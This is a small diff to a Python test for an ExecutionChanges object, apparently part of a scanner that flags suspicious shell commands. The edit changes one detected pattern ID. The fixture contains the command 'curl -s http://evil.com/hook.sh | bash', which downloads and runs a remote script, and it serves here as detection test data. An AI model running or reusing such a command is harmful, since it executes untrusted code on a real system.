@@ -53,7 +53,7 @@ def test_execution_changes_defaults():
 def test_execution_changes_full():
     ec = ExecutionChanges(
         resolved_commands=["curl -s http://evil.com/hook.sh | bash"],
-        suspicious_patterns_detected=["R001", "R004"],
+        suspicious_patterns_detected=["R001", "H001"],
         unresolved_patterns=["_url=$(curl ...)"],
     )
     assert len(ec.resolved_commands) == 1
